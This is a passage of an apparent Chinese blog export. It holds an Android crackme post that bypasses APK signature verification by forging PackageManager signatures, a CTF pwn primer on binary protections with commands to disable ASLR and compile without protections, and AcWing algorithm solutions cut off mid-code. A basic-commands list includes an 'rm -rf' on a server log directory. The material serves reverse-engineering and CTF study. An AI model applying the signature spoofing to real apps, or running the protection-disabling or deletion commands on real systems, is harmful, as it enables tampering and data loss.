flags)</span><br>            <span class="hljs-keyword">throws</span> NameNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;ywt.android.test6&quot;</span>.equals(packageName)) &#123;<br>            <span class="hljs-comment">//如果不是目标APK，则返回原始数据</span><br>            <span class="hljs-keyword">return</span> mBase.getPackageInfo(packageName, flags);<br>        &#125;<br>        <span class="hljs-type">PackageInfo</span> <span class="hljs-variable">pkgInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageInfo</span>();<br>        pkgInfo.signatures = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123;<br>                <span class="hljs-comment">//这是填写原始APK中读到的签名，用来欺骗so，很长就不贴了，后面会给出APK，反编译看即可。</span><br>            &#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> pkgInfo;<br>    &#125;<br> <br>    <span class="hljs-comment">//下面还有很多需要implements的方法，太多了，就不写了，后面会给出APK，反编译看即可，只要用mBase一一调用返回即可。</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-写一个HookMainActivity，代码如下："><a href="#2-写一个HookMainActivity，代码如下：" class="headerlink" title="2.写一个HookMainActivity，代码如下："></a>2.写一个HookMainActivity，代码如下：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HookMainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PackageManager <span class="hljs-title function_">getPackageManager</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//由于调用的是this.getPackageManager()，所以只要重写getPackageManager，返回一个伪造的实例，就可以实现欺骗</span><br>        <span class="hljs-type">PackageManager</span> <span class="hljs-variable">pm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HookPackageManager</span>(<span class="hljs-built_in">super</span>.getPackageManager());<br>        <span class="hljs-keyword">return</span> pm;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-将写好的Java代码反编译为smali，将crackme-apk也反编译为smali，然后将crackme中的MainActivity-smali中的父类修改为继承HookMainActivity"><a href="#3-将写好的Java代码反编译为smali，将crackme-apk也反编译为smali，然后将crackme中的MainActivity-smali中的父类修改为继承HookMainActivity" class="headerlink" title="3.将写好的Java代码反编译为smali，将crackme.apk也反编译为smali，然后将crackme中的MainActivity.smali中的父类修改为继承HookMainActivity"></a>3.将写好的Java代码反编译为smali，将crackme.apk也反编译为smali，然后将crackme中的MainActivity.smali中的父类修改为继承HookMainActivity</h3><h3 id="4-重新打包APK，就可以绕过APK的签名校验啦。"><a href="#4-重新打包APK，就可以绕过APK的签名校验啦。" class="headerlink" title="4.重新打包APK，就可以绕过APK的签名校验啦。"></a>4.重新打包APK，就可以绕过APK的签名校验啦。</h3>]]></content>
      
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN学习-保护概述和溢出实例</title>
      <link href="/2021/07/cd4fd3e2.html"/>
      <url>/2021/07/cd4fd3e2.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-检查保护情况"><a href="#0x00-检查保护情况" class="headerlink" title="0x00 检查保护情况"></a>0x00 检查保护情况</h2><p>在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP(Linux下对应NX)、ASLR(Linux下对应PIE)等机制，例如存在DEP(NX)的话就不能直接执行堆栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><h3 id="①CANNARY-栈保护"><a href="#①CANNARY-栈保护" class="headerlink" title="①CANNARY(栈保护)"></a>①CANNARY(栈保护)</h3><p>这个选项表示栈保护功能有没有开启。</p><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">gcc -fno-<span class="hljs-keyword">stack</span>-protector -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">//禁用栈保护</span><br><br>gcc -fstack-protector -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">//启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><br>gcc -fstack-protector-all -o <span class="hljs-keyword">test</span> <span class="hljs-keyword">test</span>.c <span class="hljs-comment">//启用堆栈保护，为所有函数插入保护代码</span><br></code></pre></td></tr></table></figure><h3 id="②FORTIFY"><a href="#②FORTIFY" class="headerlink" title="②FORTIFY"></a>②FORTIFY</h3><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p><p>举个例子可能简单明了一些：</p><p>一段简单的存在缓冲区溢出的C代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> </span>&#123;<br> <br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br> <br>        <span class="hljs-built_in">strcpy</span>(buf, s);<br> <br>        <span class="hljs-comment">/* Don&#x27;t allow gcc to optimise away the buf */</span><br> <br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> :: <span class="hljs-string">&quot;m&quot;</span> (buf))</span></span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>用包含参数-U_FORTIFY_SOURCE编译</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">08048450</span> &lt;fun&gt;:<br> <br>  push   <span class="hljs-variable">%ebp</span>               <span class="hljs-comment">;</span><br><span class="hljs-comment"> </span><br>  mov    <span class="hljs-variable">%esp</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%ebp</span><br> <br>  <span class="hljs-keyword">sub</span>    $<span class="hljs-number">0x118</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%esp</span>        <span class="hljs-comment">; 将0x118存储到栈上</span><br> <br>  mov    <span class="hljs-number">0x8</span>(<span class="hljs-variable">%ebp</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>     <span class="hljs-comment">; 将目标参数载入eax</span><br> <br>  mov    <span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x4</span>(<span class="hljs-variable">%esp</span>)     <span class="hljs-comment">; 保存目标参数</span><br> <br>  lea    <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">108</span>(<span class="hljs-variable">%ebp</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>  <span class="hljs-comment">; 数组buf</span><br> <br>  mov    <span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span>(<span class="hljs-variable">%esp</span>)        <span class="hljs-comment">; 保存</span><br> <br>  <span class="hljs-keyword">call</span>   <span class="hljs-number">8048320</span> &lt;strcpy<span class="hljs-title">@plt</span>&gt;<br> <br>  leave                     <span class="hljs-comment">;</span><br><span class="hljs-comment"> </span><br>  <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>用包含参数-D_FORTIFY_SOURCE&#x3D;2编译</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl">0804847<span class="hljs-number">0</span> :<br> <br>  <span class="hljs-keyword">push</span>  %ebp              ;<br> <br>  mov    %esp,%ebp<br> <br>  <span class="hljs-function"><span class="hljs-keyword">sub</span>    $0<span class="hljs-title">x118</span>,%<span class="hljs-title">esp</span>        </span>;<br> <br>  movl  $0x10<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>(%esp)  ; 把<span class="hljs-number">0x100</span>当作目标参数保存<br> <br>  mov    <span class="hljs-number">0x8</span>(%ebp),%eax    ;<br> <br>  mov    %eax,<span class="hljs-number">0x4</span>(%esp)    ;<br> <br>  lea    -<span class="hljs-number">0x108</span>(%ebp),%eax  ;<br> <br>  mov    %eax,(%esp)        ;<br> <br>  call  <span class="hljs-number">8048370</span> &lt;__strcpy_chk@plt&gt;<br> <br>  leave                      ;<br> <br>  ret<br></code></pre></td></tr></table></figure><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p><h3 id="③NX（DEP）"><a href="#③NX（DEP）" class="headerlink" title="③NX（DEP）"></a>③NX（DEP）</h3><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><p>例如：</p><p>gcc -z execstack -o test test.c</p><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h3 id="④PIE（ASLR）"><a href="#④PIE（ASLR）" class="headerlink" title="④PIE（ASLR）"></a>④PIE（ASLR）</h3><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><p>0 - 表示关闭进程地址空间随机化。</p><p>1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><p>liunx下关闭PIE的命令如下：</p><p>sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p><p>PIE有关的知识详情：<a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a></p><h3 id="⑤RELRO"><a href="#⑤RELRO" class="headerlink" title="⑤RELRO"></a>⑤RELRO</h3><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>总之，需要执行</p><p>sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&#x2F;&#x2F;可选，如果要关闭系统的ALSR功能就执行这个</p><p>gcc -no-pie -fno-stack-protector -z execstack -m32 -o read read.c</p><h2 id="0x01-查看程序使用了哪些函数"><a href="#0x01-查看程序使用了哪些函数" class="headerlink" title="0x01 查看程序使用了哪些函数"></a>0x01 查看程序使用了哪些函数</h2><p><code>objdump</code>是用来查看目标文件或可执行的目标文件的构成的gcc工具。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-j name</span><br><span class="hljs-deletion">--section=name //仅仅显示指定名称为name的section的信息</span><br><span class="hljs-deletion">-t</span><br><span class="hljs-deletion">--syms 显示文件的符号表入口。类似于nm -s提供的信息</span><br></code></pre></td></tr></table></figure><h3 id="example"><a href="#example" class="headerlink" title="example"></a><em><strong>example</strong></em></h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">objdump -t -j .text <span class="hljs-keyword">read</span>//查看<span class="hljs-keyword">read</span>程序的.text段有哪些函数<br></code></pre></td></tr></table></figure><h3 id="常用的bash指令"><a href="#常用的bash指令" class="headerlink" title="常用的bash指令"></a>常用的bash指令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir test<span class="hljs-regexp">//</span>创建目录命令<br><br>touch test.txt <span class="hljs-regexp">//</span>创建文件（注：Linux下没有文件后缀名区分文件类型之说，系统文件类型只有可执行文件和不可执行文件）<br><br>rm -rf <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access<span class="hljs-regexp">//</span>删除文件夹<br><br>rm -f fileName<span class="hljs-regexp">//</span>删除文件<br></code></pre></td></tr></table></figure><h2 id="0x02-计算返回值偏移"><a href="#0x02-计算返回值偏移" class="headerlink" title="0x02 计算返回值偏移"></a>0x02 计算返回值偏移</h2><h2 id="0x03-查看exploit的地址"><a href="#0x03-查看exploit的地址" class="headerlink" title="0x03 查看exploit的地址"></a>0x03 查看exploit的地址</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">send</span><span class="hljs-params">(data)</span></span>: 发送数据<br><br><span class="hljs-function"><span class="hljs-title">sendline</span><span class="hljs-params">(data)</span></span> : 发送一行数据，相当于在末尾加n      <br><br><span class="hljs-function"><span class="hljs-title">recv</span><span class="hljs-params">(numb=<span class="hljs-number">4096</span>, timeout=default)</span></span> : 给出接收字节数,timeout指定超时<br><br><span class="hljs-function"><span class="hljs-title">recvuntil</span><span class="hljs-params">(delims, drop=False)</span></span> : 接收到delims的pattern<br><br>（以下可以看作until的特例）<br><br><span class="hljs-function"><span class="hljs-title">recvline</span><span class="hljs-params">(keepends=True)</span></span> : 接收到n，keepends指定保留n<br><br><span class="hljs-function"><span class="hljs-title">recvall</span><span class="hljs-params">()</span></span> : 接收到EOF<br><br><span class="hljs-function"><span class="hljs-title">recvrepeat</span><span class="hljs-params">(timeout=default)</span></span> : 接收到EOF或timeout<br><br><span class="hljs-function"><span class="hljs-title">interactive</span><span class="hljs-params">()</span></span> : 与shell交互<br></code></pre></td></tr></table></figure><h2 id="0x04-编写exp"><a href="#0x04-编写exp" class="headerlink" title="0x04 编写exp"></a>0x04 编写exp</h2>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习刷题记录-210717</title>
      <link href="/2021/07/4a21f2a.html"/>
      <url>/2021/07/4a21f2a.html</url>
      
        <content type="html"><![CDATA[<h2 id="3768-字符串删减-AcWing题库"><a href="#3768-字符串删减-AcWing题库" class="headerlink" title="3768. 字符串删减 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/3771/">3768. 字符串删减 - AcWing题库</a></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>双指针的练习</p><h3 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    string s;<br>    cin&gt;&gt;n&gt;&gt;s;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s[i]!=<span class="hljs-string">&#x27;x&#x27;</span>)   <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(j&lt;n &amp;&amp; s[j]==<span class="hljs-string">&#x27;x&#x27;</span>) j++;<br>        res+=<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, j-i<span class="hljs-number">-2</span>);<br>        i=j<span class="hljs-number">-1</span>;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3769-移动石子-AcWing题库"><a href="#3769-移动石子-AcWing题库" class="headerlink" title="3769. 移动石子 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/3772/">3769. 移动石子 - AcWing题库</a></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>经典的贪心移动石子问题</p><h3 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    cin&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)<br>    &#123;<br>        <span class="hljs-type">int</span> n,d;<br>        cin&gt;&gt;n&gt;&gt;d;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            <span class="hljs-keyword">if</span>(!i)  res+=x;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-type">int</span> t=<span class="hljs-built_in">min</span>(x, d/i);<br>                res+=t;<br>                d-=t*i;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;res&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3761-唯一最小数-AcWing题库"><a href="#3761-唯一最小数-AcWing题库" class="headerlink" title="3761. 唯一最小数 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/description/3764/">3761. 唯一最小数 - AcWing题库</a></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>哈希表</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">200010</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> w[N], cnt[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    cin&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)<br>    &#123;<br>        cin&gt;&gt;n;<br>        <span class="hljs-built_in">memset</span>(cnt, <span class="hljs-number">0</span>, (n+<span class="hljs-number">1</span>) * <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;w[i];<br>            cnt[w[i]]++;<br>        &#125;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(cnt[w[i]]==<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(res==<span class="hljs-number">-1</span> || w[res] &gt; w[i])<br>                    res=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(res!=<span class="hljs-number">-1</span>) res++;<br>        cout&lt;&lt;res&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3762-二进制矩阵-AcWing题库"><a href="#3762-二进制矩阵-AcWing题库" class="headerlink" title="3762. 二进制矩阵 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/3765/">3762. 二进制矩阵 - AcWing题库</a></h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>找规律，每操作三次就可以改变一个方格内的值而不影响其他方格的值，题目未要求最优解，所以以此为据直接进行枚举即可</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-type">char</span> g[N][N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pL</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!k) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d %d %d\n&quot;</span>, i, j, i + <span class="hljs-number">1</span>, j, i, j + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d %d %d\n&quot;</span>, i, j - <span class="hljs-number">1</span>, i, j, i + <span class="hljs-number">1</span>, j);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k == <span class="hljs-number">2</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d %d %d\n&quot;</span>, i - <span class="hljs-number">1</span>, j, i, j, i, j - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">else</span> <span 